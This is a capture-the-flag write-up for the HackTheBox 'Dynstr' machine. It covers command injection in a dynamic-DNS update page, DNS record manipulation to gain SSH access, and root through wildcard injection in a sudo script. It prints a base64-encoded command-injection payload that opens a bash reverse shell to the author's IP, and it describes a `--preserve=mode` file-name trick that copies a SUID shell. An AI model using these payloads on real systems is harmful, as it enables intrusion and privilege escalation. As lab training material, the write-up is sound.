# HackTheBox-Dynstr

## NMAP

```bash

nmap -p- -sC -sV --min-rate 5000 10.129.6.34
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

On webserver we can see an html page refereing to Dyna DNS or "Dynamic DNS"

<img src="https://imgur.com/Ei4FDB0.png"/>

Scrolling down a bit we can see few domain names plus credentials

<img src="https://i.imgur.com/iooAyIM.png"/>

At the end we'll find a domain name `dyna.htb`

<img src="https://i.imgur.com/efHYf7z.png"/>

So let's add those domain names in `/etc/hosts` file

<img src="https://i.imgur.com/9a8ixEC.png"/>

All those domain lead up to the same page

<img src="https://i.imgur.com/UUhceXN.png"/>

Maybe we'll need to fuzz for subdomain so let's start with dyna.htb

<img src="https://i.imgur.com/UUhceXN.png"/>

We may need to filter out with 10909 characters

<img src="https://imgur.com/4VLg5iQ.png"/>

I found nothing so I tried checking any exploits for `ISC BIND 9.16.1` , it had an buffer overflow but there was no exploit for it

<img src="https://i.imgur.com/Vv0nGIP.png"/>

 let's just fuzz for files and directories using `gobuster`

<img src="https://imgur.com/03x4DJM.png"/>

This kept giving me errors so I increased the threads to 60 and it worked

<img src="https://i.imgur.com/u7sXpoM.png"/>

Going to `nic` , it doesn't show anything

<img src="https://imgur.com/DbYtavm.png"/>

Further fuzzing for files we can see `update`

<img src="https://imgur.com/wxHUtJD.png"/>

<img src="https://imgur.com/oXn9fzZ.png"/>

Here we get badauth , now remeber we found credentials on the home page so let's use them here , we can authenticate them through `curl`

<img src="https://i.imgur.com/1J0XXiP.png"/>

<img src="https://imgur.com/KxJtdpG.png"/>

And now we get `nochg our_vpn_ip`

On googling `nochg`

<img src="https://i.imgur.com/5BugrnT.png"/>

This reuslted in `no-ip dynamic dns`so on seeing the response codes

<img src="https://i.imgur.com/es6qeBl.png"/>

We can see that nochg is telling us that we haven't supplied a hostname to update so let's dig deeper on how to update a dns record

https://www.noip.com/integrate/request

<img src="https://imgur.com/dxe80Be.png"/>

So we can update dns record however it needs to be valid so going back to web page where we found potential domain names those are valid

```
dnsalias.htb
dynamicdns.htb
no-ip.htb
```
I intercepted the request with burp suite , added a header `Authorization : Basic ZHluYWRuczpzbmRhbnlk` where base64 encoded text holds username and password and tried to update either one of the domain name

<img src="Basic ZHluYWRuczpzbmRhbnlk"/>

But kept getting error so I added a random subdomain `arz.dnsalisa.htb`

<img src="https://imgur.com/mjhlsoc.png"/>

This response tells that hostname is updated but we can't do anything with it so I tried to do `command injection` here

<img src="https://imgur.com/xhYYaNI.png"/>

Following this payload list , I was able to confirm command injection

https://github.com/payloadbox/command-injection-payload-list

<img src="https://i.imgur.com/dOywGzk.png"/>

Now to get a shell that would be neded to get url encoded but it's a pain in doing that so I will first base64 encode the bash reverse shell ,pipe it to decode and then pipe it to bash

<img src="https://imgur.com/NPJdct1.png"/>

```bash
$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU3LzIyMjIgMD4mMSc=+|+base64+-d+|+bash)
```

<img src="https://imgur.com/qb18XAH.png"/>


Going into `bindmgr`'s home directory I found some files and one of them was a `script` file , a script just records every command you type on the terminal ,so on looking into script file we'll find something interesting

<img src="https://i.imgur.com/5SziTEn.png"/>

<img src="https://i.imgur.com/g4eBFpH.png"/>

Let's just put this in a bash script where we would echo the ssh key with `-e` which would enable use of escape characters but this didn't work

<img src="https://imgur.com/Cxl1ext.png"/>

It turns out it had space between lines so manually had to remove them and then I just used python3 to print the key

<img src="https://imgur.com/dPMojYZ.png"/>

<img src="https://imgur.com/vfLaPJX.png"/>

But I wasn't able to login with id_rsa key because there's host name involved in `authroized_keys` file

<img src="https://i.imgur.com/p7rHtRs.png"/>

Looking at `update` file source code we can see `nsupdate` being used with a key `/etc/bind/ddns.key`

<img src="https://i.imgur.com/2BaMnZ5.png"/>

I tried to add a domain name but it failed

<img src="https://imgur.com/Ug1Ffff.png"/>

Eventually I figuired out as we needed to use a different key so going to `/etc/bind`

<img src="https://i.imgur.com/xmwMRSV.png"/>

There's `infra.key` which makes sense that we are adding dns record for infra domain

<img src="https://i.imgur.com/QQkSQ5f.png"/>

If we do nslookup on this domain we'll get a repsonse which means this record has beend added which points to our IP

<img src="https://i.imgur.com/s8cbZ1e.png"/>

 But still we won't be able to login through ssh as use of dns is enabled as ssh goes through process of reverse dns lookup so domain name is resolving to IP but IP address won't resolve to domain name so we need to add `PTR` record for ths purpose
 
 <img src="https://i.imgur.com/jupvOMr.png"/>
 
 <img src="https://i.imgur.com/8SV6h9b.png"/>
 
 This what I followed iin order to add a PTR record also deleted the `A` record I added
 
 
 https://superuser.com/questions/977132/when-using-nsupdate-to-update-both-a-and-ptr-records-why-do-i-get-update-faile
 
 <img src="https://i.imgur.com/L095OTM.png"/>
 
 Here the space is necessary after adding `A` record, so now let's try ssh into the machine
 
 <img src="https://i.imgur.com/jV0TvzW.png"/>

Doing `sudo -l` we can see that this can run `/usr/local/bin/bindmgr.sh` as `ALL` meaning we can run this as `root` user

<img src="https://i.imgur.com/1dtN5UG.png"/>

Here it's checking for `.version` file and it's using wildcard `*` to copy everthing

<img src="https://imgur.com/X1FdMe7.png"/>

We can see that `.version` is in `/etc/` folder so this file will run there

<img src="https://imgur.com/4spVqKr.png"/>

What we can do is create `.version` file and add `42` in it as that's what the contents of original file has

<img src="https://imgur.com/DHmEZh6.png"/>

Now if we look at that script we can see that first `.version` will be checked if the contents of that file is less than or equal to `.version` file in `/etc/bind/named.bindmgr` so that's why we are going to keep it `42` nex  `cp` is being used like this `cp .version *` , it's going to copy .version file fomr current directory plus everything else so here we can do wildcard injection

<img src="https://i.imgur.com/EiQ6lqD.png"/>

So first I'll copy `/bin/bash` to current directory and make it a `SUID` binary

<img src="https://i.imgur.com/iIDvYoE.png"/>

Now here the wildcard injection takes place , we are going to abuse it by creating a file named `--preserve=mode` what it will do is while copying it will retain the attributes of the files that are in this directory , like bash has SUID so it's going to retain those atrributes and copy it to `/etc/bind/named.bindmgr` which is owned by `root`

<img src="https://i.imgur.com/lhhRSiq.png"/>

<img src="https://i.imgur.com/mox5YEg.png"/>

Now just run the script as `sudo`

<img src="https://imgur.com/RYPpeYE.png"/>

If we go to `/etc/bind/named.bindmgr` we'll see that it has `bash` as SUID binary

<img src="https://i.imgur.com/W3CL8ff.png"/>

<img src="https://i.imgur.com/0MIS6R1.png"./>

And we have rooted this machine !!!
